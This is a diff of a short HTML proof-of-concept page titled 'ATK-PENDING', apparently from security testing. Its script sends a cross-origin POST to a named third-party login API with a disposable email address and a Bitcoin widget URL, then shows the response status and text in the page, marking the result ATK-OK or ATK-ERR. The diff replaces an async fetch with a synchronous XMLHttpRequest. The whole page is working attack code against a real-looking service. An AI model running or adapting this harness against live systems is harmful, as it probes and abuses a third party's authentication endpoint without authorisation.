@@ -2,19 +2,15 @@
 <html><head><meta charset="utf-8"><title>ATK-PENDING</title></head>
 <body><pre id="out">WAITING</pre>
 <script>
-(async () => {
-  try {
-    const r = await fetch("https://widget.swapped.com/api/v1/auth/login", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ email: "atjgtytb@guerrillamailblock.com", url: "https://widget.swapped.com/?currencyCode=BTC" })
-    });
-    const t = await r.text();
-    document.title = "ATK-OK-" + r.status;
-    document.getElementById("out").textContent = "STATUS " + r.status + "\n" + t.slice(0, 600);
-  } catch (e) {
-    document.title = "ATK-ERR";
-    document.getElementById("out").textContent = "ERR " + e.message;
-  }
-})();
+try {
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "https://widget.swapped.com/api/v1/auth/login", false);
+  xhr.setRequestHeader("Content-Type", "application/json");
+  xhr.send(JSON.stringify({ email: "atjgtytb@guerrillamailblock.com", url: "https://widget.swapped.com/?currencyCode=BTC" }));
+  document.title = "ATK-OK-" + xhr.status;
+  document.getElementById("out").textContent = "STATUS " + xhr.status + "\n" + xhr.responseText.slice(0, 700);
+} catch (e) {
+  document.title = "ATK-ERR";
+  document.getElementById("out").textContent = "ERR " + e.message;
+}
 </script></body></html>
